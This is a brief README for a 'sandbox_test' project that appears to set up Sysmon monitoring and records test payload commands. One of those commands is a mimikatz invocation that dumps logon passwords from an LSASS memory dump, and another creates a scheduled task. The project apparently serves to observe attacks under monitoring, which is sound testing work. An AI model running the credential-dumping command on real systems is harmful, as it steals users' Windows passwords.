# sandbox_test

- sand.py: code
- Sysmon64.exe: sysmon
- sysmonconfig.xml: config

#### note: put Sysmon64.exe and sysmonconfig.xml in C:\Users\\{Username}\Documents

##### payload record:
SCHTASKS /Create /SC DAILY /TN "Open Notepad" /TR "notepad.exe" /ST 12:00
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
copy %USERPROFILE%\\Desktop\\SandboxFiles\\sysmonconfig.xml .
